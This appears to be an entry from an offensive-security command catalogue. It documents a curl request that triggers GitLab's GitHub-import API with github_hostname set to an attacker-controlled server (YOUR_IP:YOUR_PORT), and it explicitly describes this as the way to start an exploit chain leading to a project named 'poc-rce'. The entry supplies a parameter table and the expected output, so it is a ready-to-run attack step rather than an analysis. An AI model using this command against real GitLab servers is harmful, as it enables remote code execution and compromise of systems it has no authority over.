---
id: cmd-curl-import
name: curl-trigger-import
type: command
executor: bash
data: >-
  curl -kv "http://gitlab.example.com/api/v4/import/github" --request POST
  --header "content-type: application/json" --header "PRIVATE-TOKEN:
  YOUR_GITLAB_TOKEN" --data '{"personal_access_token":
  "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "356289002",
  "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "poc-rce",
  "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
output: '{"id": xxx, "status": "started"}'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.347Z'
platforms:
  - Linux
tags:
  - api
  - curl
  - import
verified: false
validated: true
submitted: true
---

# curl-trigger-import

## Command

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "356289002", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "poc-rce", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

## Description

Triggers the GitHub import on GitLab API, pointing to the fake server via github_hostname to initiate the exploit chain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PRIVATE-TOKEN | GitLab API token | Yes |
| personal_access_token | Fake GitHub token | Yes |
| repo_id | Repository ID (e.g., 356289002) | Yes |
| target_namespace | GitLab username/group | Yes |
| new_name | Project name | Yes |
| github_hostname | Fake server URL | Yes |

## Examples

### Basic Usage

As shown in command.

### Advanced Usage

Add --data-raw for complex JSON.

## Expected Output

JSON response indicating import started, with ID and status.

## Related

- [[procedures/Trigger-GitHub-Import-via-API]]
